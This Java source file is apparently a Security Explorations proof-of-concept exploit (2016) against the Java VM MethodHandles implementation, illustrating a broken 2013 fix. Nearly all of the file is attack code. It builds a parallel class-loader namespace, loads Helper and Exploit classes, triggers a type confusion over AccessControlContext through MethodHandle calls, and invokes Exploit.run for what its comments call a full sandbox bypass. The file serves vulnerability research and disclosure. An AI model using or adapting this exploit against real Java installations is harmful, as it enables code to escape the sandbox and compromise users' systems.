/*## (c) SECURITY EXPLORATIONS    2016 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* Java VM / MethodHandles implementation                                     */
/* violation of ClassLoader constraints for MethodHandle based calls          */
/* illustration of a broken fix from Sep 2013                                 */
 
/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.lang.*;
import java.net.*;
import java.security.*;
import java.lang.reflect.*;
import java.lang.invoke.*;
import java.applet.*;

public class Vuln69 {

  public static void create_type_confusion_and_exploit(URLClassLoader cl1) {
   try {
     /* prepare parallel ClassLoader namespace (cl2)                        */
     URL utab[]=cl1.getURLs();

     URL url=new URL(utab[0]+"/data/");
     utab=new URL[1];
     utab[0]=url;

     URLClassLoader cl2=URLClassLoader.newInstance(utab,cl1);

     /* find A, Helper and Exploit classes in cl2 namespace                 */
     MethodHandles.Lookup lookup=MethodHandles.lookup();

     Class a_cl2=cl2.loadClass("A");
     Class helper_cl2=cl2.loadClass("Helper");
     Class exploit_cl2=cl2.loadClass("Exploit");

     /* find several methods of Helper class                                */
     lookup=lookup.in(helper_cl2);

     MethodType desc=MethodType.methodType(java.security.AccessControlContext.class,new Class[0]);
     MethodHandle getACC_mh=lookup.findStatic(helper_cl2,"getACC",desc);

     Class ctab[]=new Class[1];
     ctab[0]=A.class;

     desc=MethodType.methodType(Void.TYPE,ctab);
     MethodHandle confuse_types_mh=lookup.findStatic(helper_cl2,"confuse_types",desc);

     desc=MethodType.methodType(Void.TYPE,new Class[0]);
     MethodHandle run_mh=lookup.findStatic(exploit_cl2,"run",desc);

     /* create instance of a type to confuse over                           */
     A a=new A();

     /* exploit type confusion for ACC from cl1 namespace                   */
     a.macc=AccessController.getContext();
     confuse_types_mh.invokeExact(a);

     /* exploit type confusion for ACC from cl2 namespace                   */
     a.macc=(AccessControlContext)getACC_mh.invoke();
     confuse_types_mh.invokeExact(a);

     /* invoke Exploit.run method and proceed with full sandbox bypass      */
     run_mh.invokeExact();
   } catch (Throwable e) {
    e.printStackTrace();
   }
  }

}
